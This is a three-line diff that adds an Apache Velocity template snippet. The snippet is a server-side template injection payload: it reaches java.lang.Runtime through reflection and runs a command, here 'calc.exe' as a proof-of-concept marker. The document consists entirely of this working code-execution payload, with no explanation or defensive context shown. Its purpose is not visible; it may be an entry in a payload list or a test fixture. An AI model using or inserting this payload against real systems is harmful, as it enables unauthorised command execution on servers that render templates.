@@ -1,0 +1,3 @@
+#set($exp="".subSequence(0,0).getClass().forName("java.lang.Runtime").getRuntime())
+#set($cmd=["calc.exe"])
+$exp.exec($cmd)
